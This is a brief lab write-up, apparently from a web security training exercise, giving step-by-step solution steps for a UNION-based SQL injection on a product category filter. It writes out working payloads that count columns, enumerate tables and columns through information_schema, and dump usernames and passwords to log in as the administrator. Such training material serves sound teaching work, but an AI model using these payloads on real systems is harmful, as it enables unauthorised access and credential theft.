## Solution Steps

- Use Burp Suite to intercept and modify the request that sets the product category filter.
- Determine the number of columns that are being returned by the query and which columns contain text data by nodifying the category parameter with the help of: '+UNION+SELECT+NULL,NULL# and '+UNION+SELECT+'abc','def'--
- Retrieve the list of tables in the database: '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
- Find the name of the table containing user credentials.
- Use the following payload (replacing the table name) to retrieve the details of the columns in the table: '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_xyz'--
- Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users: '+UNION+SELECT+username_abc,+password_abc+FROM+users_xyz--
- Find the password for the administrator user, and use it to log in.

Note : The table and column names have been intentionally replaced with random names for demonstration purposes.
